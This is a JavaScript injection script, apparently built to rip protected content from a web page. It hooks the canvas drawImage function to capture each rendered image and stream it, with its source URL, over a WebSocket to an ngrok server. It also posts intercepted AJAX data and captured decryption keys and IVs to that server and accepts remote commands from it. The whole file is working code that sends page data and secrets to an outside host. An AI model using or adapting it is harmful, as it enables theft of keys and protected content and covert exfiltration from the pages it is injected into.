alert("Injected ^_^")
var interval = null
window.keys = {}
window.rip_configs = {
  ajax_logger: "/api/ajax-logger",
  keys_logger: "/api/keys-logger",
  host: "https://eel-moral-ape.ngrok-free.app",
}
;(function () {
  var drawImage = CanvasRenderingContext2D.prototype.drawImage
  CanvasRenderingContext2D.prototype.drawImage = function () {
    const image = arguments[0]
    drawImage.apply(this, arguments)

    if (window.socket)
      this.canvas.toBlob(async function (blob) {
        try {
          const urlArray = new TextEncoder().encode(image.src)
          const combinedData = new Uint8Array(4 + urlArray.length + blob.size)

          combinedData.set(new Uint8Array(new Uint32Array([urlArray.length]).buffer), 0)
          combinedData.set(urlArray, 4)
          const imageBuffer = await blobToUint8Array(blob)
          combinedData.set(imageBuffer, 4 + urlArray.length)
          window.socket.send(combinedData)
        } catch (error) {
          alert(error.message)
        }
      }, "image/jpeg")
  }

  if (typeof WebSocket !== "undefined" && window.rip_configs) {
    const socket = new WebSocket(`wss://${new URL(window.rip_configs.host).host}/ws`)

    socket.addEventListener("message", (event) => {
      const { action, payload } = JSON.parse(event.data)

      if (action === "alert") alert(payload)
      if (action === "load_segment") load_segment(payload)
    })

    socket.addEventListener("open", (event) => {
      window.socket = socket
      socket.send(JSON.stringify({ action: "ping" }))
    })

    socket.addEventListener("error", (event) => {
      alert(`Xảy ra lỗi khi kết nối tới máy chủ`)
    })
  }
})()

function blobToUint8Array(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = function () {
      const arrayBuffer = this.result
      const uint8Array = new Uint8Array(arrayBuffer)
      resolve(uint8Array)
    }
    reader.onerror = function () {
      reject(new Error("Error reading Blob data."))
    }
    reader.readAsArrayBuffer(blob)
  })
}

async function load_segment(url) {
  try {
    const response = await fetch(url)
    alert(`Status: ${response.status}, statusText: ${response.statusText}`)
  } catch (error) {}
}

window.logger_callback = async (url, data_logger, show_alert = false) => {
  if (typeof fetch !== "undefined") {
    try {
      const response = await fetch(url, {
        method: "POST",
        body: JSON.stringify(data_logger),
        headers: {
          "Content-Type": "application/json",
          "X-Inject-Url": window.location.href,
        },
      })

      if (show_alert) {
        const data = await response.json()
        data.message && alert(data.message)
      }
    } catch (error) {
      show_alert && alert(error.message)
    }
  }
}

window.ajax_logger = function (data) {
  const { host, ajax_logger } = window.rip_configs || {}
  if (host && ajax_logger) window.logger_callback(host + ajax_logger, data, true)
}

window.key_logger = function (data) {
  const { host, keys_logger, key_logger } = window.rip_configs || {}

  if (data.key && data.iv && host) {
    window.keys[data.key] = data.iv

    if (window.key_logger_timeout) {
      clearTimeout(window.key_logger_timeout)
      window.key_logger_timeout = null
    }

    window.key_logger_timeout = setTimeout(async () => {
      await window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
      if (window.socket) window.socket.send(JSON.stringify({ action: "start", payload: window.fid }))
    }, 3000)
  }

  if (host && key_logger) window.logger_callback(host + key_logger, data)
}
